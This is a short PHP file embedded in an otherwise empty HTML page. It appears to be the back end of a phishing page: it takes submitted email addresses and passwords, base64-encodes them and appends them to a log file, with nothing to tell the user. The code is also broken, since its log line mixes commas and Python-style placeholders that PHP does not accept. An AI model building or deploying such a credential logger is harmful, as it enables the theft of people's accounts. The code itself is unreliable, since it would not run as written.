<!doctype html>
<html>
<head>
<meta charset="utf-8">
</head>
<?php 
	if(htmlspecialchars_decode($_POST['email']) and htmlspecialchars_decode($_POST['pwd'])) 
	{
		if(!empty($_POST['email']) and !empty($_POST['pwd'])) 
		{
			
			$email_enc = base64_encode($_POST['email']);
			$pwd_enc = base64_encode($_POST['pwd']);
			
			$save_log = 'logs.ptxt';
			$log_content = file_get_contents($save_log);
			$log_content .= "Email/Password : {0} : {1} \n", $email_enc, $pwd_enc;
			file_put_contents($save_log, $log_content);
			
			
		} else{
			
		}
	} else {
		
	}
?>

<body>
</body>
</html>